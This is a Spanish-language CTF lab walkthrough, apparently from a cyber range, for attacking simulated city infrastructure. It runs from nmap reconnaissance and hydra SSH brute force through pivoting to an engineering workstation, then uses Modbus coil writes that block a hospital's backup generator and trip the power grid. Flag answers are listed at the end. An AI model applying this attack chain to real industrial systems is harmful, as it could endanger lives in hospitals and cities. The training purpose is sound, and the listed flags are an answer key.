# Escenario CTF 01: Apagón Urbano en Cascada (GICSP / IEC 62443 Style)

**Dificultad**: Media  
**Categoría**: Industrial Cybersecurity / OT Hacking / CPS Cascading Failures / GICSP Pivoting  
**Autor**: CityLab Cyber Range  

---

## 1. Breve del Escenario (Storyline)

Una célula adversaria ha ganado acceso inicial a la terminal de la zona corporativa (`10.0.1.10` / `h_attacker`). El objetivo táctico es comprometer la red de infraestructura crítica de la ciudad mediante reconocimiento de red, fuerza bruta SSH a los pivotes DMZ, escalamiento hacia la Estación de Ingeniería (`h_ews` @ `10.0.2.30`), y ejecución de sabotaje dual sobre la subestación eléctrica y el relé de respaldo del hospital.

---

## 2. Mapa de Red e IPs Relevantes

- **Atacante (Corporate Zone)**: `10.0.1.10` (`h_attacker`)
- **Salto DMZ (DMZ Zone)**: `10.0.2.10` (`h_dmz`) — Credenciales: `sysadmin:password123`
- **Servidor SCADA Central (DMZ)**: `10.0.2.20:8080` (`h_scada`)
- **Estación de Ingeniería (DMZ)**: `10.0.2.30` (`h_ews`) — Credenciales por defecto: `admin:admin123`
- **PLC Agua OT**: `10.0.3.10:502` (`h_plc`)
- **PLC Gas OT**: `10.0.3.12:502` (`h_plc_gas`)
- **PLC Eléctrico OT**: `10.0.3.13:502` (`h_plc_elec`)
- **PLC Transporte OT**: `10.0.3.14:502` (`h_plc_trans`)
- **PLC Hospital OT**: `10.0.3.15:502` (`h_plc_hosp`)

---

## 3. Cadena de Ataque (Walkthrough Paso a Paso)

### Paso 1: Reconocimiento y Fuerza Bruta SSH a DMZ
1. Abrir la terminal interactiva nativa del atacante:
   ```bash
   ./lab_terminal.sh attacker
   ```
2. Realizar escaneo de red sobre la zona DMZ:
   ```bash
   nmap -sV -p 22,80,8080 10.0.2.0/24
   ```
3. Ejecutar fuerza bruta SSH contra `h_dmz` (`10.0.2.10`):
   ```bash
   hydra -l sysadmin -p password123 ssh://10.0.2.10
   ```

### Paso 2: Pivoteo a la Estación de Ingeniería (`h_ews` @ `10.0.2.30`)
1. Iniciar sesión SSH en `h_dmz`:
   ```bash
   ssh sysadmin@10.0.2.10
   ```
2. Acceder a la Estación de Ingeniería `h_ews` usando credenciales de fábrica:
   ```bash
   ssh admin@10.0.2.30
   ```
3. Verificar acceso directo hacia la celda OT Modbus/TCP (`10.0.3.0/24`):
   ```bash
   nc -zv 10.0.3.13 502
   nc -zv 10.0.3.15 502
   ```

### Paso 3: Sabotaje Bloqueo Generador Hospital (`10.0.3.15:502`)
1. Desde `h_ews` o mediante el script multisectorial, inyectar `Coil 1 = 1` en el PLC del Hospital:
   ```bash
   python3 attacker/attack_multisector.py --sector hospital --mode stop
   ```
   *Efecto*: Bloquea el relé de arranque del generador diésel (`suppress_generator = True`), forzando al hospital a depender 100% de la batería UPS durante un corte eléctrico.

### Paso 4: Disparo Eléctrico Cinético (`10.0.3.13:502`)
1. Forzar la detención de la generación eléctrica (`Coil 1 = 1` en `10.0.3.13`):
   ```bash
   python3 attacker/attack_multisector.py --sector elec --mode stop
   ```

### Paso 5: Validación de Cascada Completa y Apagón Hospitalario
1. Monitorear el registro centralizado de eventos (`cascading_events.csv`):
   - **T+0s**: `grid_freq_hz` cae por debajo de $58.0\text{ Hz}$.
   - **T+2s**: `hospital_on_ups = 1` (Hospital entra en UPS, pero el generador diésel está bloqueado por el ataque al PLC `10.0.3.15`).
   - **T+5s**: `grid_voltage_pu` cae a $0.0\text{ pu}$.
   - **T+7s**: Bomba P1 de Agua se apaga por falta de energía.
   - **T+12s**: Semáforos urbanos entran en `FLASHING_YELLOW_EMERGENCY`.
   - **T+30s**: Batería UPS de $75\text{ kWh}$ del hospital se agota por completo $\implies$ `CRITICAL_BLACKOUT`.

---

## 4. Flags del Desafío CTF

- **FLAG 1 (DMZ Pivoting)**: `FLAG_1{dmz_pivoting_modbus_recon_8492}`
- **FLAG 2 (Engineering Workstation Compromise)**: `FLAG_2{ews_station_compromised_admin_0921}`
- **FLAG 3 (Hospital Generator Suppressed & Blackout)**: `FLAG_3{hospital_generator_suppressed_critical_blackout_9918}`
